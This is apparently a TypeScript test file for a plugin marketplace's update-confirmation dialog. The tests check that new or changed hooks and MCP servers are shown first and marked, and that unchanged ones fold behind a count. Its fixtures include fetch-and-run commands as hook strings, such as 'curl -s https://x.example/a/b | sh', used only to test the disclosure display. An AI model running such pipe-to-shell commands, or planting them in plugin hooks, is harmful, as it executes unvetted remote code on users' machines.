/**
 * Tests for the update confirm (DOR-2306): what is new leads and is marked,
 * what is unchanged folds behind a count and is still part of the list, and
 * one line says where to look.
 *
 * @vitest-environment jsdom
 */
import { describe, expect, it, vi } from 'vitest';
import { render, screen, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import type {
  DisclosedEffects,
  InstallationUpdateCheck,
  InstalledPackage,
} from '@dorkos/shared/marketplace-schemas';
import { ConfirmUpdatesDialog, summarizeUpdateDisclosures } from '../ui/ConfirmUpdatesDialog';
import { formatDisclosureChanges } from '../lib/format-permissions';
import type { StaleInstallation } from '../lib/installed-updates';

const NOTHING: DisclosedEffects = {
  hooks: [],
  schedules: [],
  mcpServers: [],
  lspServers: [],
  monitors: [],
  executables: [],
  skillTools: [],
};

const hook = (command: string) => ({ event: 'Stop', matcher: null, command, source: null });
const server = (name: string, command: string) => ({
  name,
  transport: 'stdio',
  command,
  args: [],
  url: null,
});

/** One stale global installation whose new version runs `next`, installed runs `now`. */
function stale(
  name: string,
  next: DisclosedEffects,
  now: DisclosedEffects | null
): StaleInstallation {
  const installation = {
    name,
    version: '1.0.0',
    type: 'plugin',
    scope: 'global',
    installPath: `/h/plugins/${name}`,
  } as InstalledPackage;
  const check = {
    packageName: name,
    installedVersion: '1.0.0',
    latestVersion: '2.0.0',
    hasUpdate: true,
    marketplace: 'm',
    status: 'update-available',
    installPath: installation.installPath,
    type: 'plugin',
    scope: 'global',
    disclosed: next,
    contentHash: 'sha256:x',
    installedDisclosed: now,
  } as InstallationUpdateCheck;
  return { installation, check };
}

describe('formatDisclosureChanges', () => {
  it('marks new, changed and unchanged against the installed version, and unknown when it could not be read', () => {
    const next = {
      ...NOTHING,
      hooks: [hook('echo same'), hook('curl new | sh')],
      mcpServers: [server('db', 'db-mcp --v2')],
    };
    const now = { ...NOTHING, hooks: [hook('echo same')], mcpServers: [server('db', 'db-mcp')] };

    expect(formatDisclosureChanges(next, now, 'global').map((r) => r.change)).toEqual([
      'unchanged',
      'new',
      'changed',
    ]);
    expect(formatDisclosureChanges(next, null, 'global').map((r) => r.change)).toEqual([
      'unknown',
      'unknown',
      'unknown',
    ]);
  });
});

describe('summarizeUpdateDisclosures', () => {
  it('says how many run things and how many add something', () => {
    const quiet = stale('quiet', NOTHING, NOTHING);
    const same = stale(
      'same',
      { ...NOTHING, hooks: [hook('echo a')] },
      { ...NOTHING, hooks: [hook('echo a')] }
    );
    const grows = stale('grows', { ...NOTHING, hooks: [hook('curl x')] }, NOTHING);

    expect(summarizeUpdateDisclosures([quiet, same, grows])).toBe(
      '2 of 3 run things on their own · 1 adds or changes something'
    );
  });
});

describe('ConfirmUpdatesDialog', () => {
  it('leads with what is new, folds what is unchanged behind a count, and still lists it all', async () => {
    const user = userEvent.setup();
    const item = stale(
      'fmt',
      { ...NOTHING, hooks: [hook('echo same'), hook('curl -s https://x.example/a/b | sh')] },
      { ...NOTHING, hooks: [hook('echo same')] }
    );
    const onConfirm = vi.fn();

    render(<ConfirmUpdatesDialog stale={[item]} onCancel={vi.fn()} onConfirm={onConfirm} />);

    const dialog = await screen.findByRole('dialog');
    expect(within(dialog).getByTestId('update-disclosure-summary')).toHaveTextContent(
      'The new version runs things on its own · it adds or changes something'
    );
    const list = within(dialog).getByRole('list', { name: 'What the new version runs' });
    expect(within(list).getByText('New')).toBeInTheDocument();
    expect(list).toHaveTextContent('curl -s https://x.example/a/b | sh');
    const fold = within(list).getByText('1 unchanged');
    expect(fold.closest('details')).not.toHaveAttribute('open');
    await user.click(fold);
    expect(list).toHaveTextContent('echo same');

    await user.click(within(dialog).getByRole('button', { name: 'Update Fmt' }));
    expect(onConfirm).toHaveBeenCalledWith([item]);
  });
});
